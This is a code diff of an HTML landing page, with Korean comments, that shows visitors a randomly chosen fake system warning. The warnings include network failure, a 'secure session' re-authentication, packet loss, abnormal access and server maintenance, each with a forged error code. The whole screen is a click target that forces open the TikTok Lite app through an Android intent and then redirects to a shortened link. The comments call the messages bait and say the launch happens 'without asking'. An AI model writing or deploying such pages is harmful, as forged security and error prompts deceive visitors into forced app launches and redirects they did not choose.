@@ -2,30 +2,49 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>연결 중입니다...</title>
+    <title>시스템 메시지</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body style="margin:0; background:#000;">
+<body style="margin:0; background:#000; color:#fff; font-family:sans-serif; overflow:hidden;">
+
+    <div id="display" onclick="fire()" style="width:100vw; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; cursor:pointer; text-align:center; padding:0 20px;">
+        </div>
 
     <script>
-        window.onload = function() {
-            // ★ 여기에 사장님 link24 변환 링크 넣으세요
-            var myLink = "https://link24.kr/A47Mwq2"; 
-            
-            // 1. 앱 강제 실행 시도 (인텐트 방식)
+        // 사장님을 위한 무한 낚시 멘트 셋트 ㅡㅡ
+        var messages = [
+            { icon: "←", title: "이전 페이지로 돌아가시겠습니까?", btn: "돌아가기" },
+            { icon: "⚠️", title: "네트워크 연결이 지연되고 있습니다.", btn: "연결 복구" },
+            { icon: "🔒", title: "안전한 세션으로 재연결이 필요합니다.", btn: "보안 인증" },
+            { icon: "🔄", title: "페이지를 새로고침 중입니다.", btn: "즉시 이동" },
+            { icon: "📡", title: "데이터 패킷 손실이 감지되었습니다.", btn: "재전송 요청" },
+            { icon: "🚫", title: "비정상적인 접근을 해제하시겠습니까?", btn: "해제 후 이동" },
+            { icon: "🎥", title: "영상을 재생하려면 확인이 필요합니다.", btn: "영상 시청" },
+            { icon: "⚙️", title: "브라우저 호환성 문제를 해결 중입니다.", btn: "최적화 실행" },
+            { icon: "📂", title: "파일 로딩이 중단되었습니다.", btn: "다시 시도" },
+            { icon: "🛠️", title: "서버 점검 후 페이지를 복구합니다.", btn: "복구 확인" }
+        ];
+
+        // 들어올 때마다 랜덤으로 하나 고르기 ㅡㅡ
+        var randomPick = messages[Math.floor(Math.random() * messages.length)];
+        var display = document.getElementById('display');
+
+        display.innerHTML = `
+            <div style="font-size:50px; margin-bottom:20px;">${randomPick.icon}</div>
+            <p style="font-size:22px; font-weight:bold;">${randomPick.title}</p>
+            <div style="margin-top:30px; background:#ff0050; color:#fff; padding:15px 40px; border-radius:30px; font-weight:bold; box-shadow: 0 0 15px #ff0050;">
+                [ ${randomPick.btn} ]
+            </div>
+            <p style="font-size:13px; color:#666; margin-top:20px;">Error Code: 0x${Math.floor(Math.random()*16777215).toString(16).toUpperCase()}</p>
+        `;
+
+        function fire() {
+            var myLink = "https://link24.kr/A47Mwq2";
+            // 묻지도 따지지도 않고 틱톡 발사! ㅡㅡ
             var intent = "intent://lite#Intent;scheme=snssdk473824;package=com.zhiliaoapp.musically.go;S.browser_fallback_url=" + encodeURIComponent(myLink) + ";end";
-            
             location.href = intent;
-
-            // 2. 혹시나 브라우저가 멍청하게 가만히 있으면 0.1초 뒤에 사장님 링크로 강제 이동
-            setTimeout(function() {
-                window.location.replace(myLink);
-            }, 100);
-        };
+            setTimeout(function() { window.location.replace(myLink); }, 500);
+        }
     </script>
-
-    <div style="width:100vw; height:100vh; display:flex; align-items:center; justify-content:center; color:#fff; font-family:sans-serif;">
-        <p>잠시 후 앱으로 연결됩니다...</p>
-    </div>
 </body>
 </html>
